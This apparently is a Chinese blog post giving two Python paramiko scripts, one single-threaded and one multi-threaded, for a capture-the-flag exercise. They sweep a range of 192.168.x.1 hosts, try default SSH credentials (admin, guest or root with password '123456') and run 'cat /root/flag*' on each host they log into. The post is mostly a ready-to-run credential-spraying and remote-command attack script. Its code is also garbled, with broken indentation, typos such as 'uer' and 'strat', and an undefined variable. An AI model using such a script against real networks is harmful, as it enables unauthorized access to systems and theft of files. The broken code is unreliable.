---
title: Python-SSH批量登陆并执行命令
date: 2018-05-04
tag: Python
layout: post
---


##直接上代码
 
``` python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
import paramiko
from time import ctime
usernm = ["admin","guest","root"]
passwd = "123456"
def ssh():
	for i in range(1,254):
		for user in usernm:
			try:
			    host = "192.168.%s.1"%i
			    s=paramiko.SSHClient()
			    #创建ssh对象
			    s.load_system_host_keys()
			    s.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
			    #自动加载主机密钥 yes\no
			    s.connect(hostname=host,username=user,password=passwd)
			    stdin,stdout,stderr = s.exec_command('cat /root/flagvalue.txt')
                print "192.168.%s.1  USER:[%s]  Time:[%s]"%(i,user,ctime())
			    dd = stdout.read()
                print dd
			    stdin,stdout,stderr = s.exec_command('exit')
			    s.close
                if dd != None:
	                dd = None
	                break
	       except:
		       pass
print ssh()

```

> 跨网段批量登陆时速度明显会变慢

下面时运行结果图：
![运行结果](https://img-blog.csdn.net/20180504092159976?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhMXN5ZGExc3k=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)


#多线程版本

```
#!/usr/bin/env python
#-*- coding:utf-8 -*-
import paramiko
import threading
from time import ctime,sleep 
def ssh():
    usernm = ["admin","guest","root"]
	ip = "192.168.%s.1"%i
	for user in usernm:
                try:
					s=paramiko.SSHClient()	
					s.load_system_host_keys()
					s.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
					s.connect(hostname=ip,username=user,password='123456')
					stdin,stdout,stderr = s.exec_command('cat /root/flag*')
                    print "192.168.%s.1  USER:[%s]  Time:[%s]"%(i,uer,ctime())
					dd = stdout.read()
                    print dd
                            
					stdin,stdout,stderr = s.exec_command('exit')
					s.close
                    if dd != None:
                       dd = None
                       break
                except:
                    pass

for i in range(100,200):
        a=threading.thread(target=ssh,arg=())
        sleep(0.1)
		a.strat()
```	


运行效果：
![多线程](https://img-blog.csdn.net/20180504165634332?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhMXN5ZGExc3k=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)
